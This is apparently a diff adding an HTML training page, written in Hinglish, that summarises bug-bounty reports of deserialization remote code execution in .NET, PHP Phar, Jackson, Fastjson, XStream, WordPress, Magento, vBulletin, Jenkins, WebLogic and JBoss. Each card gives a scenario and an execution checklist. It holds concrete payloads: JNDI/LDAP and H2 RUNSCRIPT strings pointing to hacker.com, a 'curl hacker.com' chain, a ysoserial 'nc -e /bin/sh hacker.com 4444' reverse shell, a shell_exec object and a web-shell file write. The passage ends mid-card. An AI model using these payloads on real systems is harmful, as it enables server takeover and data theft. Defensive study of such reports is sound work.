+                        <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                                class="card-progress-pct">0%</span></div>
+                        <div class="card-bar-wrap">
+                            <div class="card-bar-fill"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- #06 .NET -->
+            <div class="report-card" data-severity="critical" id="report-06">
+                <div class="card-header">
+                    <div class="card-meta">
+                        <div class="report-number">◈ REPORT #06 · Total #295</div>
+                        <div class="report-title">.NET BinaryFormatter RCE via __VIEWSTATE</div>
+                        <div class="report-target">🎯 ██████ (Banking Enterprise) · HackerOne · $4,000 · 9.8 CVSS</div>
+                        <div style="margin-top:8px"><span class="technique-tag">AAEAAAD/////</span><span
+                                class="technique-tag">ysoserial.net</span><span class="technique-tag">ViewState</span>
+                        </div>
+                    </div><span class="severity-badge sev-critical">🔴 CRITICAL</span>
+                </div>
+                <div class="card-body">
+                    <div class="scenario-box">
+                        <div class="scenario-label">📋 SCENARIO</div>
+                        <div class="scenario-text">ASP.NET hidden field: <code
+                                class="c">&lt;input name="__VIEWSTATE" value="/wEPDwUK..."&gt;</code>. Base64 decode:
+                            <code class="c">AAEAAAD/////</code> = .NET serialization header. <code
+                                class="c">ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "powershell..."</code>
+                            → Submit form → Server deserialize kiya → PowerShell execute → Domain Admin!</div>
+                    </div>
+                    <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                    <ul class="checklist">
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">01</span><span
+                                class="item-text"><strong>__VIEWSTATE scan karo</strong> — ASP.NET sites par hamesha
+                                hidden fields check karo.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">02</span><span
+                                class="item-text"><strong>Magic Bytes check karo</strong> — <code
+                                    class="c">AAEAAAD/////</code> se shuru = .NET serialization confirmed.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">03</span><span
+                                class="item-text"><strong>MachineKey dhoondho</strong> — Encrypted ViewState?
+                                GitHub/config leaks mein MachineKey search karo.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">04</span><span
+                                class="item-text"><strong>Json.NET bhi test karo</strong> — <code
+                                    class="c">TypeNameHandling</code> enabled? = JSON-based RCE bhi possible.</span>
+                        </li>
+                    </ul>
+                    <div class="protip-box">
+                        <div class="protip-label">💡 MAGIC BYTES CHEATSHEET</div>
+                        <div class="protip-text">PHP: <code class="c">O:数字:</code> · Java: <code
+                                class="c">rO0AB / AC ED</code> · Python: <code class="c">gASV / 80 04</code> · Ruby:
+                            <code class="c">BAh / 04 08</code> · .NET: <code class="c">AAEAAAD/////</code> · Node: <code
+                                class="c">$$ND_FUNC$$</code></div>
+                    </div>
+                    <div class="card-progress">
+                        <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                                class="card-progress-pct">0%</span></div>
+                        <div class="card-bar-wrap">
+                            <div class="card-bar-fill"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+<!-- ═══ PHASE 2 — ADVANCED FORMAT ATTACKS ═══ -->
+<section class="phase-section" id="phase2">
+    <div class="phase-header"><span class="phase-number">PHASE 02</span><span class="phase-title">ADVANCED FORMAT
+            ATTACKS — PHAR · JACKSON · FASTJSON · XSTREAM</span><span class="phase-count" id="p2count">0 / 4
+            reports</span></div>
+    <div class="cards-grid" id="grid-phase2">
+
+        <!-- #07 Phar -->
+        <div class="report-card" data-severity="critical" id="report-07">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">◈ REPORT #07 · Total #296</div>
+                    <div class="report-title">PHP Phar Deserialization — File Wrapper RCE Trick</div>
+                    <div class="report-target">🎯 ██████ (Image Hosting) · HackerOne · $2,000 · High/Critical</div>
+                    <div style="margin-top:8px"><span class="technique-tag">phar://</span><span
+                            class="technique-tag">Polyglot Image</span><span class="technique-tag">file_exists()</span>
+                    </div>
+                </div><span class="severity-badge sev-critical">🔴 CRITICAL</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">📋 SCENARIO</div>
+                    <div class="scenario-text">Website profile picture upload karti hai aur <code
+                            class="c">file_exists()</code> se check karti hai. Hacker ne Polyglot file banayi — bahar se
+                        <code class="c">image.jpg</code>, andar se Phar archive with malicious PHP object. Input: <code
+                            class="c">phar:///var/www/html/uploads/hacker.jpg/any.txt</code> → PHP ne <code
+                            class="c">file_exists()</code> chalaya → Metadata deserialize → <code
+                            class="c">__destruct()</code> trigger → RCE bina unserialize() ke!</div>
+                </div>
+                <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>File wrappers test karo</strong> — Input mein <code
+                                class="c">phar://</code>, <code class="c">gopher://</code>, <code
+                                class="c">dict://</code> bhej sakte ho?</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>File operations identify karo</strong> — <code
+                                class="c">file_exists()</code>, <code class="c">is_readable()</code>, <code
+                                class="c">file_get_contents()</code> — ye sab vulnerable.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>Polyglot image banao</strong> — Image header (<code
+                                class="c">FF D8 FF</code>) + Phar metadata = valid image + valid phar.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>Magic Methods check karo</strong> — PHP classes mein <code
+                                class="c">__destruct</code> ya <code class="c">__wakeup</code> dhoondho (source
+                            leak/GitHub).</span>
+                    </li>
+                </ul>
+                <div class="mindset-box">
+                    <div class="mindset-label">🧠 KEY TAKEAWAY</div>
+                    <div class="mindset-text">"unserialize() function na hona ye guarantee NAHI hai ki deserialization
+                        bug nahi milega. PHP ke 30+ filesystem functions Phar deserialization trigger kar sakte hain."
+                    </div>
+                </div>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- #08 Jackson -->
+        <div class="report-card" data-severity="critical" id="report-08">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">◈ REPORT #08 · Total #297</div>
+                    <div class="report-title">Jackson Polymorphic Typing — JSON Shape-Shifter RCE</div>
+                    <div class="report-target">🎯 ██████ (Financial Analytics) · HackerOne · $5,000 · 9.8 CVSS</div>
+                    <div style="margin-top:8px"><span class="technique-tag">enableDefaultTyping()</span><span
+                            class="technique-tag">@class</span><span class="technique-tag">Marshalsec</span></div>
+                </div><span class="severity-badge sev-critical">🔴 CRITICAL</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">📋 SCENARIO</div>
+                    <div class="scenario-text">JSON mein class naam: <code
+                            class="c">["com.target.User", {"name":"avin"}]</code>. Library <code
+                            class="c">enableDefaultTyping()</code> use kar rahi thi. Hacker ne payload: <code
+                            class="c">["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;INIT=RUNSCRIPT FROM 'http://hacker.com/rce.sql'"}]</code>
+                        → Jackson ne class instantiate ki → SQL file download → RCE!</div>
+                </div>
+                <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Type info check karo</strong> — JSON mein <code
+                                class="c">@class</code> ya <code class="c">["className", ...]</code> format =
+                            polymorphic typing.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>Jackson version identify karo</strong> — <code
+                                class="c">pom.xml</code>, <code class="c">build.gradle</code> mein version check
+                            karo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>Gadget libraries scan karo</strong> — Logback, Spring, Hibernate —
+                            inmein RCE gadgets hote hain.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>Marshalsec tool use karo</strong> — JSON deserialization ke liye
+                            ysoserial nahi, Marshalsec kaam aata hai.</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- #09 Fastjson -->
+        <div class="report-card" data-severity="critical" id="report-09">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">◈ REPORT #09 · Total #298</div>
+                    <div class="report-title">Fastjson AutoType Bypass — Blacklist Evade RCE</div>
+                    <div class="report-target">🎯 ██████ (E-commerce & Logistics) · HackerOne · $3,500 · 9.8 CVSS</div>
+                    <div style="margin-top:8px"><span class="technique-tag">@type</span><span
+                            class="technique-tag">JNDI/LDAP</span><span class="technique-tag">Blacklist Bypass</span>
+                    </div>
+                </div><span class="severity-badge sev-critical">🔴 CRITICAL</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">📋 SCENARIO</div>
+                    <div class="scenario-text">JSON mein <code class="c">@type</code> keyword = Fastjson. Developers ne
+                        blacklist lagayi thi. Hacker ne "L" aur ";" magic characters se bypass: <code
+                            class="c">{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;", "dataSourceName":"ldap://hacker.com:1389/Exploit", "autoCommit":true}</code>
+                        → Server ne LDAP se Exploit.class load ki → Full System Compromise!</div>
+                </div>
+                <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>@type search karo</strong> — JSON request mein <code
+                                class="c">@type</code> dikhe = 99% Fastjson.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>DNSLog se test karo</strong> — <code
+                                class="c">java.net.InetAddress</code> ya <code class="c">java.net.URL</code> class try
+                            karo DNS trigger karne ko.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>AutoType status check karo</strong> — Modern versions mein off
+                            hota hai, par koi endpoint explicitly on kiya ho?</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>Encoding tricks try karo</strong> — <code class="c">\u004c</code>
+                            (L), extra <code class="c">[</code>, Unicode se blacklist bypass karo.</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- #10 XStream -->
+        <div class="report-card" data-severity="critical" id="report-10">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">◈ REPORT #10 · Total #299</div>
+                    <div class="report-title">XML XStream Deserialization — Dynamic Proxy RCE</div>
+                    <div class="report-target">🎯 ██████ (Logistics Platform) · HackerOne · $4,500 · 9.8 CVSS</div>
+                    <div style="margin-top:8px"><span class="technique-tag">fromXML()</span><span
+                            class="technique-tag">Dynamic Proxy</span><span class="technique-tag">ProcessBuilder</span>
+                    </div>
+                </div><span class="severity-badge sev-critical">🔴 CRITICAL</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">📋 SCENARIO</div>
+                    <div class="scenario-text">Server <code class="c">Content-Type: application/xml</code> accept kar
+                        raha tha. XML mein <code class="c">&lt;sorted-set&gt;</code> tags + <code
+                            class="c">&lt;dynamic-proxy&gt;</code> + <code class="c">EventHandler</code> → <code
+                            class="c">ProcessBuilder.start()</code> trigger → <code class="c">curl hacker.com</code>
+                        execute → DNS callback confirmed → Bounty!</div>
+                </div>
+                <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>XML inputs scan karo</strong> — API endpoints jo <code
+                                class="c">&lt;tags&gt;</code> accept karte hain.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>Known CVEs test karo</strong> — XStream v1.4.17 se niche bahut
+                            saari public RCEs hain.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>Interface tags check karo</strong> — <code
+                                class="c">&lt;interface&gt;</code> ya <code class="c">&lt;handler&gt;</code> kaam kar
+                            rahe? = 100% vulnerable.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>Burp Collaborator use karo</strong> — <code
+                                class="c">curl</code>/<code class="c">nslookup</code> se blind execution confirm
+                            karo.</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ═══ PHASE 3 — CMS & APPLICATION FRAMEWORKS ═══ -->
+<section class="phase-section" id="phase3">
+    <div class="phase-header"><span class="phase-number">PHASE 03</span><span class="phase-title">CMS & APPLICATION
+            FRAMEWORK ATTACKS</span><span class="phase-count" id="p3count">0 / 3 reports</span></div>
+    <div class="cards-grid" id="grid-phase3">
+
+        <!-- #12 WordPress -->
+        <div class="report-card" data-severity="critical" id="report-12">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">◈ REPORT #12 · Total #301</div>
+                    <div class="report-title">WordPress Metadata RCE — Phar + Object Combo</div>
+                    <div class="report-target">🎯 ██████ (Media & Publishing) · HackerOne · $3,500 · 9.0 CVSS</div>
+                    <div style="margin-top:8px"><span class="technique-tag">wp_postmeta</span><span
+                            class="technique-tag">Polyglot EXIF</span><span
+                            class="technique-tag">maybe_unserialize()</span></div>
+                </div><span class="severity-badge sev-critical">🔴 CRITICAL</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">📋 SCENARIO</div>
+                    <div class="scenario-text">WordPress metadata DB mein serialized store hota hai. Polyglot image
+                        banayi — EXIF Caption mein PHP serialized payload. Gadget: <code
+                            class="c">Requests_Utility_FilteredIterator</code>. Media library sync → <code
+                            class="c">unserialize()</code> call → <code class="c">__destruct()</code> → Image ke
+                        metadata se object "zinda" hua → RCE!</div>
+                </div>
+                <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Plugin options scan karo</strong> — Plugins settings ko serialize
+                            karke <code class="c">wp_options</code> mein rakhte hain. User-controllable?</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>Image metadata test karo</strong> — Upload feature mein EXIF/XMP
+                            fields mein payload daalo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>Phar wrapper check karo</strong> — <code
+                                class="c">wp_get_attachment_thumb_file()</code> jaise functions phar:// ke liye
+                            vulnerable.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>Gadgets analyze karo</strong> — <code class="c">Requests</code>
+                            library ya <code class="c">Guzzle</code> jo WordPress ke saath aati hain = best
+                            gadgets.</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- #13 Magento -->
+        <div class="report-card" data-severity="critical" id="report-13">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">◈ REPORT #13 · Total #302</div>
+                    <div class="report-title">Magento Object Injection — Shopping Cart to Shell</div>
+                    <div class="report-target">🎯 ██████ (Luxury Fashion) · HackerOne · $7,500 · 9.8 CVSS</div>
+                    <div style="margin-top:8px"><span class="technique-tag">Zend_Log_Writer</span><span
+                            class="technique-tag">Cart Cookie</span><span class="technique-tag">File Write</span></div>
+                </div><span class="severity-badge sev-critical">🔴 CRITICAL</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">📋 SCENARIO</div>
+                    <div class="scenario-text">Cookie: <code class="c">st_cart_id</code> = serialized PHP object (<code
+                            class="c">O:20:"Magento\Framework\Object":...</code>). Gadget: <code
+                            class="c">Zend_Log_Writer_Stream</code> (log files likhta hai). <code
+                            class="c">_stream</code> = <code class="c">/var/www/html/shell.php</code>, <code
+                            class="c">_mode</code> = <code class="c">a</code>. Cart update → <code
+                            class="c">__destruct()</code> → shell.php created → Full Site Compromised!</div>
+                </div>
+                <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Cart & Wishlist check karo</strong> — Cookies/POST mein cart,
+                            wishlist, session objects search karo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>Zend Framework gadgets dhoondho</strong> — <code
+                                class="c">Zend_Filter</code>, <code class="c">Zend_Log</code> = legendary
+                            gadgets.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>REST/SOAP APIs check karo</strong> — Input ko serialized format
+                            mein manga jata hai wahan.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>Product Comparison test karo</strong> — Comparison feature mein
+                            product IDs serialize karke bheja jata hai.</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- #14 vBulletin -->
+        <div class="report-card" data-severity="critical" id="report-14">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">◈ REPORT #14 · Total #303</div>
+                    <div class="report-title">vBulletin 5.x RCE — AJAX Hook Unserialize</div>
+                    <div class="report-target">🎯 ██████ (Tech Forum) · HackerOne · $2,500 · 9.8 CVSS</div>
+                    <div style="margin-top:8px"><span class="technique-tag">decodeArguments</span><span
+                            class="technique-tag">vB_Render_Template</span><span class="technique-tag">AJAX API</span>
+                    </div>
+                </div><span class="severity-badge sev-critical">🔴 CRITICAL</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">📋 SCENARIO</div>
+                    <div class="scenario-text"><code class="c">ajax/api/hook/decodeArguments</code> endpoint par data
+                        direct <code class="c">unserialize()</code> hota tha. Gadget: <code
+                            class="c">vB_Render_Template</code> — template parameter mein PHP code. Payload: <code
+                            class="c">arguments=O:18:"vB_Render_Template":1:{s:11:"template";s:20:"print(shell_exec('id'));"}</code>
+                        → Template render → <code class="c">id</code> command execute → Forum Admin!</div>
+                </div>
+                <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>AJAX endpoints scan karo</strong> — <code class="c">/ajax/</code>
+                            aur <code class="c">/api/</code> endpoints hamesha track karo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>Routing params check karo</strong> — <code class="c">route</code>,
+                            <code class="c">hook</code>, <code class="c">arg</code> mein serialized strings?</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>Template classes dhoondho</strong> — <code
+                                class="c">vB_Render</code>, <code class="c">Smarty</code>, <code class="c">Twig</code> —
+                            template engines = RCE ka rasta.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>Known CVEs test karo</strong> — CVE-2019-16759, CVE-2020-17496 =
+                            legendary vBulletin bugs.</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ═══ PHASE 4 — ENTERPRISE INFRASTRUCTURE ═══ -->
+<section class="phase-section" id="phase4">
+    <div class="phase-header"><span class="phase-number">PHASE 04</span><span class="phase-title">ENTERPRISE
+            INFRASTRUCTURE — JENKINS · WEBLOGIC · JBOSS</span><span class="phase-count" id="p4count">0 / 3
+            reports</span></div>
+    <div class="cards-grid" id="grid-phase4">
+
+        <!-- #15 Jenkins -->
+        <div class="report-card" data-severity="critical" id="report-15">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">◈ REPORT #15 · Total #304</div>
+                    <div class="report-title">Jenkins Remoting Deserialization — CI/CD Pipeline RCE</div>
+                    <div class="report-target">🎯 ██████ (Fortune 500 CI/CD) · HackerOne · $5,000 · 10.0 CVSS</div>
+                    <div style="margin-top:8px"><span class="technique-tag">X-Jenkins-CLI</span><span
+                            class="technique-tag">Binary Protocol</span><span class="technique-tag">Supply Chain</span>
+                    </div>
+                </div><span class="severity-badge sev-critical">🔴 CRITICAL</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">📋 SCENARIO</div>
+                    <div class="scenario-text">Jenkins CLI binary protocol se Java objects receive karta hai. Header:
+                        <code class="c">X-Jenkins-CLI-Port</code>. <code
+                            class="c">ysoserial CommonsCollections1 "nc -e /bin/sh hacker.com 4444"</code> → Custom
+                        Python script se CLI port par bheja → <code class="c">readObject()</code> → Reverse Shell →
+                        Supply chain attack possible!</div>
+                </div>
+                <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>X-Jenkins headers check karo</strong> — In headers ka hona =
+                            Jenkins confirmed.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>CLI port test karo</strong> — Publically accessible high port? =
+                            Direct attack vector.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>CVE-2017-1000353 check karo</strong> — Famous "Signed
+                            Serialization" bug.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>Groovy scripts scan karo</strong> — Groovy inject =
+                            Deserialization jaisa impact.</span>
+                    </li>
+                </ul>
+                <div class="impact-box">
+                    <div class="impact-label">💥 IMPACT</div>
+                    <div class="impact-text">Jenkins hack = company ke main code mein "Backdoor" daal sakte ho jo har
+                        user tak pahunch jayega. Supply Chain Attack — impact millions of users.</div>
+                </div>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- #16 WebLogic -->
+        <div class="report-card" data-severity="critical" id="report-16">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">◈ REPORT #16 · Total #305</div>
+                    <div class="report-title">Oracle WebLogic T3 Protocol — Unauthenticated RCE</div>
+                    <div class="report-target">🎯 ██████ (Banking Infrastructure) · HackerOne · $8,500 · 9.8 CVSS</div>
+                    <div style="margin-top:8px"><span class="technique-tag">T3 Protocol</span><span
+                            class="technique-tag">Port 7001</span><span class="technique-tag">JDK7u21</span></div>
+                </div><span class="severity-badge sev-critical">🔴 CRITICAL</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">📋 SCENARIO</div>
+                    <div class="scenario-text">Nmap: <code class="c">7001/tcp open weblogic-t3</code>. Handshake: <code
+                            class="c">t3 12.2.1</code> → Server: <code class="c">HELO</code> = T3 active.
+                        CommonsCollections1 blocked → <code class="c">JDK7u21</code> gadget (blacklist mein nahi) →
+                        <code class="c">python3 weblogic_t3_exploit.py &lt;IP&gt; 7001 payload.bin</code> → Windows
+                        System Access!</div>
+                </div>
+                <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Port 7001/7002 scan karo</strong> — WebLogic ke default ports par
+                            T3 check karo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>T3 protocol confirm karo</strong> — <code
+                                class="c">nmap -sV --script realport-info</code> se verify karo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>CVE-2020-14882 test karo</strong> — Famous unauthenticated
+                            RCE.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>IIOP bhi test karo</strong> — T3 ke alawa IIOP aur XML-RPC par bhi
+                            vulnerable ho sakta hai.</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- #17 JBoss -->
+        <div class="report-card" data-severity="critical" id="report-17">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">◈ REPORT #17 · Total #306</div>
+                    <div class="report-title">JBoss RMI Deserialization — Invoker Servlet RCE</div>
+                    <div class="report-target">🎯 ██████ (EU Government Portal) · HackerOne · $4,200 · 9.8 CVSS</div>
+                    <div style="margin-top:8px"><span class="technique-tag">RMI Registry</span><span
+                            class="technique-tag">Port 1099</span><span class="technique-tag">JMXInvokerServlet</span>
+                    </div>
+                </div><span class="severity-badge sev-critical">🔴 CRITICAL</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">📋 SCENARIO</div>
+                    <div class="scenario-text">Nmap: <code class="c">1099/tcp open rmiregistry</code>. <code
+                            class="c">/invoker/JMXInvokerServlet</code> accessible = binary file download. Hacker ne
+                        JRMP listener start kiya, JBoss server ko trick kiya: "Mere machine (port 1337) se connect ho" →
+                        JBoss ne connect kiya → payload fetch → deserialize → System Shell!</div>
+                </div>
+                <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Port 1099/4444 scan karo</strong> — Standard JBoss/Java RMI
+                            ports.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>/invoker/ endpoints check karo</strong> — <code
